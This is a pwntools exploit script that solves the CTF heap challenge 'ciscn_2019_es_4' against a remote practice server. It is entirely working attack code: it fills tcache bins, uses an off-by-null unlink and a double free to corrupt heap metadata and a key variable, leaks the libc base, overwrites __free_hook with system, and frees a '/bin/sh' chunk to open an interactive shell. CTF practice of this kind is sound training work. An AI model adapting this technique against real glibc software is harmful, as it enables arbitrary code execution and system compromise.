from pwn import *

context.log_level = 'debug'

#p = process('./ciscn_2019_es_4')
p = remote('node4.buuoj.cn', 29439)
elf = ELF('./ciscn_2019_es_4')

libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p ,'''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(index, size, content):
    sla(b'4.show\n', b'1')
    sla(b'index:', str(index).encode())
    sla(b'size:', str(size).encode())
    ru(b'gift: ')
    gift = int(ru(b'\ncontent:')[:-9], 16)
    sn(content)
    return gift

def edit(index, content):
    sla(b'4.show\n', b'3')
    sla(b'index:', str(index).encode())
    sa(b'content:', content)

def delete(index):
    sla(b'4.show\n', b'2')
    sla(b'index:', str(index).encode())

def show(index):
    sla(b'4.show\n', b'4')
    sla(b'index:', str(index).encode())

heaparray = 0x6020E0
key2 = 0x6022B8

bins = [alloc(i, 0xf0, b'aa') for i in range(7)]

alloc(7, 0x88, b'a')
alloc(8, 0xf0, b'a')
alloc(9, 0xb0, b'a')

[delete(i) for i in range(7)]

#off by null
fd = heaparray + 7 * 8 - 0x18
bk = heaparray + 7 * 8 - 0x10
edit(7, p64(0) + p64(0x81) + p64(fd) + p64(bk) + b'a' * 0x60 + p64(0x80))
delete(8)

#double free
alloc(0, 0xf0, b'aa')
alloc(1, 0xf0, b'aa')
alloc(2, 0xf0, b'aa')

edit(7, p64(bins[6]) + p64(bins[5]) + p64(bins[4]))
delete(0)
delete(4)

alloc(10, 0xf0, p64(key2))
alloc(11, 0xf0, b'a')
alloc(12, 0xf0, p32(114514))

alloc(13, 0x90, b'a' * 8)
show(13)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1e0 - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['__libc_system']

success('libc_base -> {}'.format(hex(libc_base)))

delete(10)
delete(11)

alloc(14, 0xf0, p64(free_hook))
alloc(15, 0xf0, b'/bin/sh\x00')
alloc(16, 0xf0, p64(system))

delete(15)

p.interactive()